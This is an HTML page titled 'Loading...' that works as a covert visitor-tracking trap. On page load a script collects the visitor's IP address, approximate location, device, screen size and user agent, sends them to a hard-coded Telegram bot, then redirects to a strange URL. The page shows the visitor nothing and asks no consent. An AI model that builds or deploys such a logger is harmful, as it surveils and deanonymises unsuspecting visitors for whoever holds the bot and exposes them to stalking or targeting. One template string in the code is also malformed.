<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
<script>
(async () => {
    const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM';
    const CHAT_ID   = '7863510010';
    const REDIRECT  = 'https://www.misha/dad/image23689/august2024.com';
    const API       = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // IP grab – works everywhere
    let ip  = 'Unknown IP';
    let loc = 'Unknown location';
    try {
        const r = await fetch('https://ipapi.co/json/');
        if (r.ok) {
            const d = await r.json();
            ip  = d.ip;
            loc = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
        }
    } catch(e) {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            ip = d.ip;
        } catch(e) {}
    }

    const ua = navigator.userAgent;

    // Very small device detection – enough for your use case
    let device = 'Unknown device';
    if (/iPhone|iPad|iPod/.test(ua)) device = ua.includes('iPad') ? 'iPad' : 'iPhone';
    else if (/Android/.test(ua)) device = ua.match(/Android [^;]+; ([^)]+)/)?.[1]?.trim() || 'Android Device';

    // Build message
    const text = `
*NEW VISITOR*

*Time:* ${new Date().toISOString().replace('T',' ').substring(0,19)}
*IP:* ${ip}
*Location:* ${loc}
*Device:* ${device}
*Screen:* \( {screen.width}× \){screen.height}
*UA:* \`${ua}\``;

    // Send to Telegram
    await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text.trim(),
            parse_mode: 'Markdown'
        })
    }).catch(() => {});

    // Redirect
    setTimeout(() => location.replace(REDIRECT), 800);
})();
</script>
</body>
</html>
